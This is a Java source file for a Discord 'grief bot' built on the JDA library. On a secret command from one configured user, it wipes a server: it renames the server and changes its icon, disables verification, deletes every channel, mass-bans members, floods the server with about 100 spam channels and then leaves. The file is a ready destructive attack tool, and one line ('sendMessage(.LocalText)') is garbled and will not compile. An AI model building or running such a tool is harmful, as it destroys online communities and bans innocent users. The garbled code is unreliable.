package de.corruptedbytes;

import java.io.IOException;
import java.util.Random;

import de.corruptedbytes.utils.Config;
import de.corruptedbytes.utils.ErrorHandler;
import de.corruptedbytes.utils.Utils;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.ChannelType;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Guild.VerificationLevel;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class GriefBotListener extends ListenerAdapter {
	
	@Override
	public void onReady(ReadyEvent e) {
		Utils.sendInfo();
	}
	
	
	@Override
	public void onMessageReceived(MessageReceivedEvent e) {
		if (e.isFromType(ChannelType.TEXT)) {
			Message msg = e.getMessage();
			Guild g = e.getGuild();
			User u = e.getMessage().getAuthor();
						
			if (msg.getContentDisplay().equalsIgnoreCase(GriefBot.instance.griefCommand) && u.getId() == GriefBot.instance.grieferUserID) {
				try { msg.delete().queue(); } catch (Exception ignored) {}
				try {
					if (g.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
						startGrief(g, u);
					}
					else
					{
						new ErrorHandler("It looks like your bot doesn't have Administrator perms. Please check, give it the perms then try again!");
					}
				} catch (Exception ex) {
					new ErrorHandler(ex.getMessage());
				}
			}
		}
	}
	
	public void startGrief(Guild g, User u) throws IOException {
		String name = GriefBot.instance.griefMessage.replace("%NAME%", u.getName());
		g.getManager().setIcon(Icon.from(Config.griefPicture)).queue();
		g.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
		g.getManager().setName(name).queue();
		
		g.getChannels().forEach(key -> {
			key.delete().queue();
		});		
		
		g.createTextChannel("").complete(); //put here the names for the channels in the ""
		
		for (Member members : g.getMembers()) {
			if (members.isOwner() || members.getUser().isBot() || members.getId() == GriefBot.instance.grieferUserID) {
				continue;
			} 
			else
			{
				members.getGuild().ban(members.getUser(), 7, "haha nuked").queue();
			}
		}

		for (int i = 0; i < 105; i++) {
			if (i <= 100) {
				try {
					TextChannel grief = g.createTextChannel((name + "-" + new Random().nextInt(Integer.MAX_VALUE)).toLowerCase()).complete();
					grief.sendMessage(.LocalText).queue();
					grief.sendFile(Config.griefPicture).queue();
				} catch (Exception ignored) {}
			}
			else
			{
				g.leave().queue();
				break;
			}
		}
	}
}